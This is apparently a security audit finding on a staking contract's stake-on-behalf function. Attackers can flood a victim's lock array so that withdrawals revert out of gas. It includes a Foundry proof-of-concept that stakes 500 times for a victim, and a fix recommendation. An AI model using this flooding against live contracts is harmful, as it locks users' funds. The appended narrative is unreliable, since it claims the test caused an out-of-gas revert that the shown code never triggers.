---
id: 4581
severity: "High"
---

# Malicious user can flood a user's staked locks array and prevent the user from withdrawing due to Out Of Gas revert Submitted by pineneedles, also found by ilyadruzh and 0xHex

## Description

The function MFDBase.stake() allows to stake on behalf of someone else. During staking, a StakedLock is pushed into the user's $.userLocks[user] array. When a StakedLock expires, the user is eligible to withdraw their staked tokens. However, every exposed function in MFDBase that attempts to withdraw a user's expired locks calls MFDLogic.handleWithdrawOrRelockLogic() with _limit equal to the length of $.userLocks[msg.sender]. For example, MFDBase.withdrawExpiredLocks():
```solidity
function withdrawExpiredLocks() external whenNotPaused returns (uint256) {
    uint256 unlocked = getUserBalances(msg.sender).unlocked;
    if (unlocked == 0) revert AmountZero();
    _beforeWithdrawExpiredLocks(unlocked);
    MultiFeeDistributionStorage storage $ = _getMFDBaseStorage();
    return MFDLogic.handleWithdrawOrRelockLogic($, msg.sender, false, $.userLocks[msg.sender].length);
}
```
Therefore, the entire array $.userLocks[msg.sender] will be traversed in attempt to withdraw expired locks. If the array's length becomes excessive, an Out Of Gas revert can occur that will prevent a user from ever withdrawing their expired locks. Since MFDBase.stake() allows staking on behalf of someone else, a malicious user can flood other user's arrays with StakedLocks that contain small amounts of LP tokens, essentially increasing the array's size to a point where the user will not be able to ever withdraw due to the Out Of Gas revert.

## Proof of Concept

```solidity
// The following test displays how a user's userLocks can increase to a size of 501.
// • Add the test displayed below to POC_Test.t.sol.
// • Add the helper functions _stake_user_with_index() and _stake_user_on_behalf() to POC_Test.t.sol.
// • Add the imports displayed below.
// • Execute with forge test --match-test test_poc_issue8 -vv.
// • Inspect the logs.
function test_poc_issue8() public {
    address user = makeAddr("user");
    address maliciousUser = makeAddr("maliciousUser");
    vm.prank(user);
    staker.setDefaultLockIndex(2);
    // Create a new reward token
    MockToken newRewardToken = new MockToken("newreward", "newreward");
    // Remove the reward address(1024), the MockVe has this hardcoded and is added as reward during deployment
    // If not removed some functions revert since address(1024) is not a ERC20
    vm.prank(Admin.addr);
    staker.removeReward(address(1024));
    // Add the new reward
    vm.prank(Admin.addr);
    staker.addReward(address(newRewardToken));
    // User stakes for 3 months
    _stake_user_with_index(user, 1 ether, THREE_MONTH_TYPE_INDEX);
    // Malicious user stakes on behalf of the user with small amounts of LP tokens
    // thus flooding the user's locks array
    for(uint i=0; i < 500; i++) {
        _stake_user_on_behalf(maliciousUser, user, 1e10);
    }
    StakedLock[] memory locks = staker.getUserLocks(user);
    console.log("lenght of the locks array:",locks.length);
}

function _stake_user_with_index(address user, uint256 amount, uint256 index) internal {
    uint256 amount = 1 ether;
    load_weth9(user, amount, weth9);
    uint256 lpAmount;
    vm.startPrank(user);
    {
        weth9.approve(address(lockzap), amount);
        (,, uint256 minLpTokens) = vAmmPoolHelper.quoteAddLiquidity(0, amount);
        console.log("minLpTokens", minLpTokens);
        lpAmount = lockzap.zap(
            amount, // weth9Amt
            0, // emissionTokenAmt
            index, // lockTypeIndex
            minLpTokens // slippage check
        );
    }
    vm.stopPrank();
}

function _stake_user_on_behalf(address user, address onBehalf, uint256 amount) internal {
    uint256 amount = 1 ether;
    load_weth9(user, amount, weth9);
    uint256 lpAmount;
    vm.startPrank(user);
    {
        weth9.approve(address(lockzap), amount);
        (,, uint256 minLpTokens) = vAmmPoolHelper.quoteAddLiquidity(0, amount);
        console.log("minLpTokens", minLpTokens);
        lpAmount = lockzap.zapOnBehalf(
            amount, // weth9Amt
            0, // emissionTokenAmt
            onBehalf,
            minLpTokens // slippage check
        );
    }
    vm.stopPrank();
}
```
```solidity
import {Reward, StakedLock} from "../src/dependencies/MultiFeeDistribution/MFDDataTypes.sol";
import {MockToken} from "./mocks/MockToken.t.sol";
```

## Recommendation

Add an upper bound to how many StakedLock elements there can be in a userLocks array.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract allows any address to call the stake function on behalf of an arbitrary user. Each call creates a StakedLock structure and appends it to the target user’s userLocks array. Withdrawal functions such as withdrawExpiredLocks read the entire userLocks array by passing the array length as a limit to the internal handleWithdrawOrRelockLogic routine. Because there is no upper bound on how many StakedLock entries a single user can hold, a malicious actor can repeatedly stake tiny amounts for a victim, inflating the victim’s array to hundreds or thousands of elements. When the victim later invokes a withdrawal, the contract must iterate over the full array; the gas required grows linearly with the number of entries. Once the array becomes large enough, the transaction exceeds the block gas limit and reverts with an out‑of‑gas error, preventing the user from ever extracting the tokens that have already expired. From the user’s perspective the UI reports a failed withdrawal, no tokens are received, and the locked balance appears to remain unchanged even though the lock period has ended. The root cause is the combination of (1) an unrestricted “stake on behalf of” entry point and (2) withdrawal logic that processes the entire per‑user array without pagination or a size cap. This pattern is a classic unbounded‑array‑growth denial‑of‑service bug: the contract’s accounting assumptions that a user’s lock list will stay reasonably small are violated, leading to a situation where funds become effectively inaccessible. The issue was uncovered during a security audit and reproduced with a proof‑of‑concept test that flooded a victim’s lock array to a length of 501 entries, causing the withdrawExpiredLocks call to run out of gas. The problem is subtle because the contract still functions correctly for normal‑sized arrays, and the out‑of‑gas revert does not explicitly indicate that the array is too large. To remediate, the contract should enforce a maximum number of StakedLock entries per user, introduce pagination or batch processing for withdrawals, or provide a mechanism to prune expired locks before iterating, thereby ensuring that gas consumption remains bounded and users can always retrieve their unlocked tokens.
